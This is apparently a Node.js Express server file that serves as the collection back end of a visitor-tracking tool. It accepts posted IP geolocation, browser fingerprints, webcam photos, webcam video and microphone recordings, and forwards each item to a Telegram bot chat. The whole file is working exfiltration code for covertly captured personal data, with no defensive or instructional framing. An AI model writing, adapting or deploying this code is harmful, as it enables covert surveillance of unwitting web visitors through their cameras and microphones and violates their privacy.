const express = require('express');
const cors = require('cors');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in environment variables.');
}

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));

// ================================================================
// BUILD A COMPACT, PLAIN-TEXT SUMMARY – NO MARKDOWN, NO LARGE FIELDS
// ================================================================
function buildMessage(ipData, fingerprint) {
    let msg = '📡 New Visitor Info\n\n';

    // IP Info (essential only)
    if (ipData) {
        msg += 'IP: ' + (ipData.ip || 'N/A') + '\n';
        if (ipData.city) msg += 'City: ' + ipData.city + '\n';
        if (ipData.region) msg += 'Region: ' + ipData.region + '\n';
        if (ipData.country_name) msg += 'Country: ' + ipData.country_name + '\n';
        if (ipData.org) msg += 'ISP: ' + ipData.org + '\n';
        msg += '\n';
    }

    // Device & Browser (truncated)
    if (fingerprint) {
        msg += 'Device & Browser:\n';
        // User agent truncated to 60 chars
        const ua = (fingerprint.userAgent || '').substring(0, 60);
        msg += 'User Agent: ' + ua + '\n';
        msg += 'Platform: ' + (fingerprint.platform || 'N/A') + '\n';
        msg += 'Language: ' + (fingerprint.language || 'N/A') + '\n';
        if (fingerprint.screen) {
            msg += 'Screen: ' + fingerprint.screen.width + 'x' + fingerprint.screen.height +
                   ' (' + fingerprint.screen.colorDepth + 'bit, ratio ' + fingerprint.screen.pixelRatio + ')\n';
        }
        msg += 'Touch Points: ' + fingerprint.maxTouchPoints + '\n';
        msg += 'Cores: ' + fingerprint.hardwareConcurrency + '\n';
        msg += 'Memory: ' + fingerprint.deviceMemory + ' GB\n';
        msg += 'Timezone: ' + fingerprint.timezone + '\n';
        // GPU (truncated to 50 chars)
        if (fingerprint.webgl && fingerprint.webgl !== 'not supported' && fingerprint.webgl !== 'unsupported') {
            const gpu = (fingerprint.webgl.renderer || '').substring(0, 50);
            msg += 'GPU: ' + gpu + '\n';
        }
        msg += '\n';
    }

    msg += 'Timestamp: ' + new Date().toISOString();

    // Brutal byte-length truncation (Telegram max = 4096 bytes, we use 3800)
    const maxBytes = 3800;
    let buf = Buffer.from(msg, 'utf8');
    if (buf.length > maxBytes) {
        // Slice to maxBytes, then decode safely (may cut a multi-byte char)
        buf = buf.slice(0, maxBytes);
        // Remove the last incomplete character by truncating to a valid UTF-8 boundary
        let safeString = buf.toString('utf8');
        // If the last byte started a multi-byte sequence, it will be replaced by a replacement character.
        // To be absolutely safe, we slice off the last 3 characters to avoid garbled ending.
        safeString = safeString.substring(0, safeString.length - 3);
        msg = safeString + '...';
    }

    return msg;
}

// ================================================================
// TELEGRAM SENDERS
// ================================================================
async function sendTextMessage(text) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const res = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text,
                // NO parse_mode – plain text avoids any formatting issues
            })
        });

        if (!res.ok) {
            const err = await res.json();
            console.error('❌ Telegram sendMessage failed:', err);
        }
    } catch (e) {
        console.error('sendTextMessage error:', e);
    }
}

async function sendPhoto(base64) {
    try {
        const base64Data = base64.includes(',') ? base64.split(',')[1] : base64;
        const buffer = Buffer.from(base64Data, 'base64');
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', new Blob([buffer], { type: 'image/jpeg' }), 'webcam.jpg');
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
    } catch (e) {
        console.error('sendPhoto error:', e);
    }
}

async function sendVideo(base64) {
    try {
        const base64Data = base64.includes(',') ? base64.split(',')[1] : base64;
        const buffer = Buffer.from(base64Data, 'base64');
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('video', new Blob([buffer], { type: 'video/mp4' }), 'webcam.mp4');
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
            method: 'POST',
            body: formData
        });
    } catch (e) {
        console.error('sendVideo error:', e);
    }
}

async function sendAudio(base64) {
    try {
        const base64Data = base64.includes(',') ? base64.split(',')[1] : base64;
        const buffer = Buffer.from(base64Data, 'base64');
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('audio', new Blob([buffer], { type: 'audio/wav' }), 'mic.wav');
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, {
            method: 'POST',
            body: formData
        });
    } catch (e) {
        console.error('sendAudio error:', e);
    }
}

// ================================================================
// MAIN ENDPOINT
// ================================================================
app.post('/api/telegram', async (req, res) => {
    try {
        const { ipData, fingerprint, photo, video, mic, timestamp } = req.body;

        console.log(`[+] Received at ${timestamp}`);
        console.log(`[+] IP: ${ipData?.ip}`);
        console.log(`[+] Photo: ${photo ? 'yes' : 'no'}`);
        console.log(`[+] Video: ${video ? 'yes' : 'no'}`);
        console.log(`[+] Mic: ${mic ? 'yes' : 'no'}`);

        // 1. Always send compact text
        const message = buildMessage(ipData, fingerprint);
        await sendTextMessage(message);

        // 2. Media
        if (photo) await sendPhoto(photo);
        if (video) await sendVideo(video);
        if (mic) await sendAudio(mic);

        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Error processing request:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Backend running on port ${PORT}`);
});